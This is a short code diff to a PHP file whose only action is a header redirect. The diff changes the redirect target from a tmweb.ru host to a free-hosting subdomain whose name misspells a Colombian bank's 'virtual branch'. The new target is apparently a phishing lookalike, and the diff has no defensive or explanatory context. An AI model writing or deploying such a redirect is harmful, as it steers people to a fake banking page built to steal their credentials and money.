@@ -1,4 +1,4 @@
 <?php
-	header("location: http://cl18139.tmweb.ru/");
+	header("location: http://sucursalbancolombivirtul0721.liveblog365.com/");
 ?>
 
